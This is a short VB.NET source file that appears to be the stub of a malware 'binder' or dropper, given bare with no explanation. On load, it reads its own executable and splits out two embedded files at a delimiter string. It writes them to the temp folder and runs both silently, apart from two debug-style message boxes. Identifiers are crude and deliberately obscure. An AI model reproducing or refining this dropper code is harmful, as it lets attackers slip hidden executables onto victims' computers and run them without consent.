Public Class form1
    Const ImaPimpBitch = "(^Dedadee^)"
    Dim somewhereovertherainbow As String = System.IO.Path.GetTempPath
    Dim MoreJunk, SomeRandomBS() As String
    Private Sub GitterDone() Handles MyBase.Load
        Try
            FirstStep()
        Catch ex As Exception
            MsgBox(ex.ToString)
            Me.Close()
            End
        End Try
        Me.Close()
        End
    End Sub
    Sub FirstStep()
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        MoreJunk = Space(LOF(1))
        FileGet(1, MoreJunk)
        FileClose(1)
        SomeRandomBS = Split(MoreJunk, ImaPimpBitch)
        SecondStep()
    End Sub
    Sub SecondStep()
        FileOpen(3, somewhereovertherainbow & "\" & SomeRandomBS(2), OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(3, SomeRandomBS(1))
        FileClose(3)
        FileOpen(5, somewhereovertherainbow & "\" & SomeRandomBS(4), OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(5, SomeRandomBS(3))
        FileClose(5)
        ThirdStep()
    End Sub
    Sub ThirdStep()
        MsgBox(somewhereovertherainbow & SomeRandomBS(2))
        MsgBox(somewhereovertherainbow & SomeRandomBS(4))
        System.Diagnostics.Process.Start(somewhereovertherainbow & SomeRandomBS(2))
        System.Diagnostics.Process.Start(somewhereovertherainbow & SomeRandomBS(4))
        Me.Close()
        End
    End Sub
End Class